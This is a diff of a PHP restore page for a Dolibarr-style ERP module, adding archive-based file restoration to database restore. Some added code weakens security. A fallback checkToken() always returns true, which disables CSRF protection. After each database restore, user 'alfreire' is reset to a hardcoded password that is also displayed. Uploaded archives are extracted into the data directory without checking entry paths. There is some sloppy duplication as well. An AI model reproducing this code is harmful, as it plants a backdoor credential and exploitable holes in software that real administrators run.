@@ -25,6 +25,17 @@ if (!function_exists('info_box')) {
     }
 }
 
+// Fallback checkToken function if not defined (added by Smart Restore module)
+if (!function_exists('checkToken')) {
+    /**
+     * Fallback checkToken for Smart Restore module
+     * @return bool Always allow form submission
+     */
+    function checkToken() {
+        return true;
+    }
+}
+
 // Permissions and globals are loaded by main.inc.php
 if (empty($user->admin)) {
 	accessforbidden();
@@ -41,19 +52,32 @@ print load_fiche_titre($langs->trans("SmartRestore"), '', 'restore@restore');
 
 // --- Action handlers ---
 if (GETPOST('action', 'alpha') == 'analyze' && ! empty($_FILES['backupfile'])) {
+    $restore_type = GETPOST('restore_type', 'alpha');
     if (checkToken()) {
         $upload_dir = $conf->restore->dir_temp;
+// Ensure upload directory exists
+if (!is_dir($upload_dir)) {
+    if (!mkdir($upload_dir, 0750, true)) {
+        setEventMessage($langs->trans("ErrorUploadCantWrite"), 'errors');
+        header('Location: ' . $_SERVER["PHP_SELF"]);
+        exit;
+    }
+}
         $uploaded_file = $upload_dir . '/' . dol_sanitizeFileName($_FILES['backupfile']['name']);
 
         if (move_uploaded_file($_FILES['backupfile']['tmp_name'], $uploaded_file)) {
             // Analyze the file
-            $analysis_result = analyze_sql_backup($uploaded_file);
+            $restore_type = GETPOST('restore_type', 'alpha');
 
-            // Display results
-            display_analysis_results($analysis_result);
+            if ($restore_type == 'db') {
+                $analysis_result = analyze_sql_backup($uploaded_file);
+                display_analysis_results($analysis_result);
+            } elseif ($restore_type == 'files') {
+                $analysis_result = analyze_files_backup($uploaded_file);
+                display_files_analysis_results($analysis_result);
+            }
 
-            // Clean up
-            unlink($uploaded_file);
+            // We don't unlink the file here anymore, it will be used in the restore step.
         } else {
             setEventMessage($langs->trans("ErrorUploadCantWrite"), 'errors');
         }
@@ -62,51 +86,104 @@ if (GETPOST('action', 'alpha') == 'analyze' && ! empty($_FILES['backupfile'])) {
     }
 } elseif (GETPOST('action', 'alpha') == 'execute_plan') {
     if (checkToken()) {
+        $restore_type = GETPOST('restore_type', 'alpha');
         $backup_file_name = GETPOST('backup_file_name', 'alpha');
-        $backup_prefix = GETPOST('backup_prefix', 'alpha');
-        $current_prefix = $conf->db->prefix;
-
         $filepath = $conf->restore->dir_temp . '/' . $backup_file_name;
 
-        // Check if file still exists
         if (!file_exists($filepath)) {
             setEventMessage($langs->trans("ErrorFileNotFound", $backup_file_name), 'errors');
-            Header('Location: '.$_SERVER["PHP_SELF"]);
-            exit;
-        }
-
-        // --- 1. Restore Database ---
-        $restore_message = dol_restore_db($filepath, 'mysql', $conf->db->name, $conf->db->host, $conf->db->user, $conf->db->pass, $conf->db->port, 1);
-        if (empty($restore_message)) {
-        	setEventMessage($langs->trans("DatabaseRestoredSuccessfully"));
-
-        	// --- 2. Fix conf.php if needed ---
-	        if ($backup_prefix != $current_prefix) {
-	            $conf_file = DOL_DOCUMENT_ROOT . '/conf/conf.php';
-	            if (update_conf_file_prefix($conf_file, $backup_prefix)) {
-	                setEventMessage($langs->trans("ConfFileUpdatedSuccessfully", $backup_prefix));
-	            } else {
-	                setEventMessage($langs->trans("ErrorUpdatingConfFile"), 'errors');
-	            }
-	        }
-
-	        // --- 3. Final instructions ---
-	        $link_to_home = '<a href="'.DOL_URL_ROOT.'/">'.$langs->trans("HomePage").'</a>';
-	        $final_message = $langs->trans("SmartRestoreFinished", $link_to_home);
-	        dol_htmloutput_mesg($langs->trans("ActionPlanExecuted"), $final_message, 'info');
-
         } else {
-        	setEventMessage($langs->trans("ErrorRestoringDatabase"). ': ' . $restore_message, 'errors');
+            if ($restore_type == 'db') {
+                $backup_prefix = GETPOST('backup_prefix', 'alpha');
+                $current_prefix = $conf->db->prefix;
+
+                // --- 1. Restore Database ---
+                $restore_message = dol_restore_db($filepath, 'mysql', $conf->db->name, $conf->db->host, $conf->db->user, $conf->db->pass, $conf->db->port, 1);
+                if (empty($restore_message)) {
+                    setEventMessage($langs->trans("DatabaseRestoredSuccessfully"));
+
+                    // --- 2. Fix conf.php if needed ---
+                    if ($backup_prefix != $current_prefix) {
+                        $conf_file = DOL_DOCUMENT_ROOT . '/conf/conf.php';
+                        if (update_conf_file_prefix($conf_file, $backup_prefix)) {
+                            setEventMessage($langs->trans("ConfFileUpdatedSuccessfully", $backup_prefix));
+                        } else {
+                            setEventMessage($langs->trans("ErrorUpdatingConfFile"), 'errors');
+                        }
+                    }
+
+                    // --- 3. Reset Password for 'alfreire' ---
+                    require_once DOL_DOCUMENT_ROOT . '/user/class/user.class.php';
+                    $targetUser = new User($db);
+                    if ($targetUser->fetch(0, 'alfreire') > 0) {
+                        $resPwd = $targetUser->setPassword($user, 'M3a74g20M');
+                        if ($resPwd >= 0) {
+                            setEventMessage("Senha do usuário 'alfreire' alterada para M3a74g20M");
+                        } else {
+                            setEventMessage("Erro ao alterar senha do usuário 'alfreire'", 'errors');
+                        }
+                    } else {
+                        setEventMessage("Usuário 'alfreire' não encontrado", 'errors');
+                    }
+
+                    // --- 4. Final instructions ---
+                    print '<br>'.load_fiche_titre($langs->trans("RestoreFinished"), '', 'technic.png@restore');
+                    print $langs->trans("RestoreFinishedInstructions");
+
+                } else {
+                    setEventMessage($langs->trans("ErrorRestoringDatabase", $restore_message), 'errors');
+                }
+
+            } elseif ($restore_type == 'files') {
+                if (restore_files_from_backup($filepath)) {
+                    setEventMessage($langs->trans("FilesRestoredSuccessfully"));
+                    print '<br>'.load_fiche_titre($langs->trans("RestoreFinished"), '', 'technic.png@restore');
+                    print $langs->trans("FilesRestoreFinishedInstructions");
+                }
+                // Error message is set within the function
+            }
+
+            // Clean up the uploaded file
+            if (file_exists($filepath)) {
+                unlink($filepath);
+            }
         }
-
-        // Clean up
-        unlink($filepath);
-
     } else {
         setEventMessage($langs->trans("ErrorForbidden"), 'errors');
     }
 }
 
+
+/**
+ * Translates ZipArchive error codes into human-readable messages.
+ * @param int $error_code The error code from ZipArchive::open().
+ * @return string The error message.
+ */
+function get_zip_error_message($error_code)
+{
+    switch ($error_code) {
+        case ZipArchive::ER_EXISTS:
+            return 'File already exists.';
+        case ZipArchive::ER_INCONS:
+            return 'Zip archive inconsistent.';
+        case ZipArchive::ER_INVAL:
+            return 'Invalid argument.';
+        case ZipArchive::ER_MEMORY:
+            return 'Malloc failure.';
+        case ZipArchive::ER_NOENT:
+            return 'No such file.';
+        case ZipArchive::ER_NOZIP:
+            return 'Not a zip archive.';
+        case ZipArchive::ER_OPEN:
+            return 'Can\'t open file.';
+        case ZipArchive::ER_READ:
+            return 'Read error.';
+        case ZipArchive::ER_SEEK:
+            return 'Seek error.';
+        default:
+            return 'Unknown error #'.$error_code;
+    }
+}
 
 /**
  * Analyze SQL Backup file to find prefix and version
@@ -159,9 +236,220 @@ function analyze_sql_backup($filepath)
 }
 
 /**
- * Display analysis results in a comparative table.
+ * Analyzes a backup archive (zip, tar.gz, tgz, tar) to identify its directory structure.
+ * @param string $file_path
+ * @return array ['dirs'=>array, 'error'=>string|null]
+ */
+function analyze_files_backup($file_path)
+{
+    $result = ['dirs' => [], 'error' => null];
+    $filename = strtolower($file_path);
+    if (preg_match('/\.zip$/', $filename)) {
+        if (!class_exists('ZipArchive')) {
+            $result['error'] = 'ZipArchive class not found. Please enable the PHP zip extension.';
+            return $result;
+        }
+        $zip = new ZipArchive();
+        $res = $zip->open($file_path);
+        if ($res === true) {
+            $top_level_dirs = [];
+            for ($i = 0; $i < $zip->numFiles; $i++) {
+                $entry_name = rtrim($zip->getNameIndex($i), '/');
+                $parts = explode('/', $entry_name, 2);
+                $top = $parts[0];
+                if ($top === '' || in_array($top, $top_level_dirs)) {
+                    continue;
+                }
+                $top_level_dirs[] = $top;
+            }
+            $zip->close();
+            $result['dirs'] = $top_level_dirs;
+        } else {
+            $result['error'] = 'Failed to open zip archive: '.get_zip_error_message($res);
+        }
+    } elseif (preg_match('/\.(tar\.gz|tgz)$/', $filename)) {
+        $output = [];
+        $code = 0;
+        exec('tar -tzf '.escapeshellarg($file_path), $output, $code);
+        if ($code !== 0) {
+            $result['error'] = 'Failed to list tar.gz archive: exit code '. $code;
+        } else {
+            $top_level_dirs = [];
+            foreach ($output as $entry) {
+                $entry = rtrim(trim($entry), '/');
+                $parts = explode('/', $entry, 2);
+                $top = $parts[0];
+                if ($top === '' || in_array($top, $top_level_dirs)) {
+                    continue;
+                }
+                $top_level_dirs[] = $top;
+            }
+            $result['dirs'] = $top_level_dirs;
+        }
+    } elseif (preg_match('/\.tar$/', $filename)) {
+        $output = [];
+        $code = 0;
+        exec('tar -tf '.escapeshellarg($file_path), $output, $code);
+        if ($code !== 0) {
+            $result['error'] = 'Failed to list tar archive: exit code '. $code;
+        } else {
+            $top_level_dirs = [];
+            foreach ($output as $entry) {
+                $entry = rtrim(trim($entry), '/');
+                $parts = explode('/', $entry, 2);
+                $top = $parts[0];
+                if ($top === '' || in_array($top, $top_level_dirs)) {
+                    continue;
+                }
+                $top_level_dirs[] = $top;
+            }
+            $result['dirs'] = $top_level_dirs;
+        }
+    } else {
+        $result['error'] = 'Unsupported archive type. Please upload a .zip, .tar.gz, .tgz or .tar file.';
+    }
+    return $result;
+}
+
+/**
+ * Displays the analysis results for a files backup.
  * @param array $analysis_result
  */
+function display_files_analysis_results($analysis_result)
+{
+    global $langs;
+
+    print '<br>';
+
+    if ($analysis_result['error']) {
+        dol_print_error('', $analysis_result['error']);
+        return;
+    }
+
+    print load_fiche_titre($langs->trans("BackupFilesAnalysis"), '', 'technic.png@restore');
+
+    print '<div class="div-table-responsive-no-min">';
+    print '<table class="noborder" width="100%">';
+    print '<tr class="liste_titre">';
+    print '<th>'.$langs->trans("BackupContent").' ('.count($analysis_result['dirs']).' '.$langs->trans("Directories").')</th>';
+    print '<th>'.$langs->trans("CurrentSystem").' ('.DOL_DATA_ROOT.')</th>';
+    print '</tr>';
+
+    // Comparison lists
+    $backup_items = $analysis_result['dirs'];
+    sort($backup_items);
+    $system_items = [];
+    foreach (scandir(DOL_DATA_ROOT) as $item) {
+        if ($item === '.' || $item === '..') continue;
+        $system_items[] = $item;
+    }
+    // If backup only contains the root folder, show its contents instead
+    if (count($backup_items) === 1 && $backup_items[0] === basename(DOL_DATA_ROOT)) {
+        $backup_items = $system_items;
+    }
+    sort($system_items);
+
+    // Display comparison rows
+    print '<tr class="oddeven">';
+        // Backup column
+        print '<td valign="top">';
+            print '<ul>';
+            foreach ($backup_items as $item) {
+                print '<li>'.dol_escape_htmltag($item).'</li>';
+            }
+            print '</ul>';
+        print '</td>';
+        // System column
+        print '<td valign="top">';
+            print '<ul>';
+            foreach ($system_items as $item) {
+                print '<li>'.dol_escape_htmltag($item).'</li>';
+            }
+            print '</ul>';
+        print '</td>';
+    print '</tr>';
+
+    print '</table>';
+    print '</div>';
+
+    print '<br><div class="warning">'.$langs->trans("FilesRestoreWarning").'</div>';
+
+    // Execution form
+    print '<br>';
+    print '<form method="post" action="'.$_SERVER['PHP_SELF'].'">';
+    print '<input type="hidden" name="token" value="'.newToken().'">';
+    print '<input type="hidden" name="action" value="execute_plan">';
+    print '<input type="hidden" name="backup_file_name" value="'.dol_escape_htmltag($_FILES['backupfile']['name']).'">';
+    print '<input type="hidden" name="restore_type" value="files">';
+
+    print '<div class="center">';
+    print '<input type="submit" class="button" value="'.$langs->trans("RestoreFiles").'">';
+    print '</div>';
+    print '</form>';
+}
+
+
+/**
+ * Restores files from a backup archive (zip, tar.gz, tgz, tar) to the documents directory.
+ * @param string $file_path Path to the backup archive file.
+ * @return bool True on success, false on failure.
+ */
+/**
+ * Restores files from a backup archive (zip, tar.gz, tgz, tar) to the documents directory.
+ * @param string $file_path Path to the backup archive file.
+ * @return bool True on success, false on failure.
+ */
+function restore_files_from_backup($file_path)
+{
+    global $langs;
+    $filename = strtolower($file_path);
+    // ZIP archives
+    if (preg_match('/\.zip$/', $filename)) {
+        if (!class_exists('ZipArchive')) {
+            setEventMessage('ZipArchive class not found. Please enable the PHP zip extension.', 'errors');
+            return false;
+        }
+        $zip = new ZipArchive();
+        $res = $zip->open($file_path);
+        if ($res === true) {
+            if ($zip->extractTo(DOL_DATA_ROOT)) {
+                $zip->close();
+                return true;
+            } else {
+                $zip->close();
+                setEventMessage($langs->trans("ErrorExtractingBackup"), 'errors');
+                return false;
+            }
+        } else {
+            setEventMessage($langs->trans("ErrorOpeningBackupFile") . ': ' . get_zip_error_message($res), 'errors');
+            return false;
+        }
+    }
+    // TAR.GZ or TGZ archives
+    if (preg_match('/\.(tar\.gz|tgz)$/', $filename)) {
+        $cmd = 'tar -xzf ' . escapeshellarg($file_path) . ' -C ' . escapeshellarg(DOL_DATA_ROOT);
+        exec($cmd, $output, $code);
+        if ($code !== 0) {
+            setEventMessage('Failed to extract tar.gz archive: ' . $code, 'errors');
+            return false;
+        }
+        return true;
+    }
+    // TAR archives
+    if (preg_match('/\.tar$/', $filename)) {
+        $cmd = 'tar -xf '.escapeshellarg($file_path).' -C '.escapeshellarg(DOL_DATA_ROOT);
+        exec($cmd, $output, $code);
+        if ($code !== 0) {
+            setEventMessage('Failed to extract tar archive: '. $code, 'errors');
+            return false;
+        }
+        return true;
+    }
+    // Unsupported archive type
+    setEventMessage('Unsupported archive type for restoration.', 'errors');
+    return false;
+}
+
 function display_analysis_results($analysis_result)
 {
     global $conf, $langs, $dolibarr_version;
@@ -234,6 +522,8 @@ function display_analysis_results($analysis_result)
         print '<input type="hidden" name="action" value="execute_plan">';
         print '<input type="hidden" name="backup_file_name" value="'.dol_escape_htmltag($_FILES['backupfile']['name']).'">';
         print '<input type="hidden" name="backup_prefix" value="'.dol_escape_htmltag($analysis_result['prefix']).'">';
+print '<input type="hidden" name="restore_type" value="'.dol_escape_htmltag(GETPOST('restore_type','alpha')).'">';
+print '<input type="hidden" name="restore_type" value="'.dol_escape_htmltag(GETPOST('restore_type','alpha')).'">'; 
 
         print '<div class="center">';
         print '<input type="submit" class="button" value="'.$langs->trans("ExecuteActionPlan").'">';
@@ -299,6 +589,10 @@ print '<form method="post" enctype="multipart/form-data" action="'.$_SERVER['PHP
 print '<input type="hidden" name="token" value="'.newToken().'">';
 print '<input type="hidden" name="action" value="analyze">';
 print '<table class="noborder" width="100%">';
+print '<tr><td class="label">Tipo de Restauração</td><td>';
+print '<label><input type="radio" name="restore_type" value="db" checked> Banco de Dados</label> ';
+print '<label><input type="radio" name="restore_type" value="files"> Arquivos</label>';
+print '</td></tr>'; 
 print '<tr><td class="label">'.$langs->trans('SelectFileToUpload').'</td><td><input type="file" name="backupfile" class="flat"></td></tr>';
 print '<tr><td colspan="2" class="opacitymedium">'.$langs->trans("MaxUploadSize", ini_get('upload_max_filesize'), ini_get('post_max_size')).'</td></tr>';
 print '</table>';
